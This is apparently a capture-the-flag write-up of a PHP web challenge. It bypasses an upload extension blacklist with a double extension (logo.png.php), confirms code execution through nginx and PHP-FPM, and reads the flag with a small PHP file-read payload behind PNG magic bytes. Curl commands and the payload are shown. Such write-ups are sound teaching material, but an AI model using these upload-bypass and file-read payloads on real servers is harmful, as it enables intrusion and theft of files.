---
title: 'Web: BrandKit Studio'
description: 'Double extension upload bypass on nginx + PHP-FPM to get arbitrary file read.'
pubDate: '2026-03-26'
author: 'riverxia'
---

# brandkit studio

metactf web. branding toolkit — upload a logo, customize colors/text, preview social media assets, download as zip. php behind nginx. upload saves files to `/uploads/<session_hash>/<filename>` with the original filename. already suspicious.

## recon

upload `totally_different_name.jpg` → saves as `totally_different_name.jpg`. filename preserved. interesting.

try `shell.php` → blocked. `.phtml`, `.phar`, `.php5`, `.pht` → blocked. case variations → blocked. blacklist.

response headers: `nginx/1.29.6`. php behind php-fpm.

## double extension bypass

blacklist catches `.php` but not `.png.php` — double extension, `.php` at the end:

```bash
curl -X POST http://target/upload.php \
  -F "logo=@shell.png.php;filename=logo.png.php;type=image/png"
```

```
uploads/eb2147904c0856c967a2d2afa62559b7/logo.png.php
```

uploaded. nginx's `location ~ \.php$` block matches `.php` anywhere in the filename and hands it to php-fpm.

## does it execute?

```bash
curl -sv "http://target/uploads/.../logo.png.php?cmd=id"
< Content-Type: text/html; charset=UTF-8
```

`text/html` not `image/png` — it's executing. but output is just PNG header bytes, command functions are disabled:

```
disable_functions: exec,passthru,shell_exec,system,proc_open,popen
```

## file read

`file_get_contents()` works. prepend PNG magic bytes (`\x89PNG\r\n\x1a\n`) to pass the image check, upload this:

```php
<?php
echo implode(', ', scandir('/'));
echo file_get_contents('/flag-33ebe70a06a4017da2c4a910cf2aa95f.txt');
?>
```

```bash
curl "http://target/uploads/.../f.png.php"
MetaCTF{ju5t_a_b17_0f_f1l3_3x3cut10n_a5_a_tr3at}
```

`scandir('/')` found the randomized flag filename. gg.
